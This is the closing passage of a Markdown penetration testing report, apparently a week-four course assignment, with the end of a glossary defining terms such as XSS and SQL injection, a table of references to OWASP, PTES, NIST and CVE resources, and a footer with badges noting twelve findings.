| **XSS** | Cross-Site Scripting — injecting malicious scripts into web pages |
| **SQLi** | SQL Injection — inserting SQL code into queries via user input |
| **CVSS** | Common Vulnerability Scoring System — standardized vulnerability severity scoring |
| **OWASP** | Open Web Application Security Project — nonprofit producing web security standards |

### D. References

| Resource | URL |
|---|---|
| OWASP Top 10 (2021) | https://owasp.org/Top10/ |
| OWASP Testing Guide v4.2 | https://owasp.org/www-project-web-security-testing-guide/ |
| PTES Standard | http://www.pentest-standard.org/ |
| NIST SP 800-115 | https://csrc.nist.gov/publications/detail/sp/800/115/final |
| CVSS v3.1 Calculator | https://www.first.org/cvss/calculator/3.1 |
| OWASP Cheat Sheet Series | https://cheatsheetseries.owasp.org/ |
| CWE Database | https://cwe.mitre.org/ |
| NVD CVE Database | https://nvd.nist.gov/ |

---

<div align="center">

**Week 4 — Final Penetration Testing Report**

<img src="https://img.shields.io/badge/Report-Complete-green?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Findings-12%20Total-red?style=for-the-badge"/>
<img src="https://img.shields.io/badge/Demo-Ready-purple?style=for-the-badge"/>

*For questions or re-testing requests, contact the assessment team.*

</div>
